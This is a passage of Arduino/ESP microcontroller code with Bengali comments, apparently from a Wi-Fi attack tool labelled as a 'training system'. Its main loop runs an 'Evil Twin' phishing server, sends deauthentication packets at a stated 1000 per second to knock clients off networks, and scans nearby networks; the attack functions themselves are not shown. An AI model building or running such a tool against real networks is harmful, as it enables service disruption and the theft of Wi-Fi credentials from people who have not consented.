    Serial.println("\n🚀 SYSTEM READY FOR TRAINING");
    Serial.println("   Connect to WiFi: " + String(adminSSID));
    Serial.println("   Password: " + String(adminPASS));
    Serial.println("   Open browser: http://192.168.4.1");
    Serial.println("\n╔══════════════════════════════════════════╗");
    Serial.println("║    TRAINING SYSTEM ACTIVE               ║");
    Serial.println("╚══════════════════════════════════════════╝\n");
}

// ========== LOOP ফাংশন ==========

void loop() {
    // Admin সার্ভার হ্যান্ডেল
    adminServer.handleClient();
    
    // Evil Twin সার্ভার হ্যান্ডেল (যদি সক্রিয় থাকে)
    if(isEvilTwinActive) {
        phishingServer.handleClient();
    }
    
    // Deauth অ্যাটাক (প্রতি 5ms এ 5টি packet = 1000 packets/sec)
    static unsigned long lastDeauth = 0;
    if(isDeauthActive && millis() - lastDeauth > 5) {
        simulateDeauthAttack();
        lastDeauth = millis();
    }
    
    // প্রতি 30 সেকেন্ডে নেটওয়ার্ক স্ক্যান (যখন Deauth অ্যাক্টিভ নয়)
    static unsigned long lastScan = 0;
    if(!isDeauthActive && millis() - lastScan > 30000) {
        scanNetworks();
        lastScan = millis();
    }
}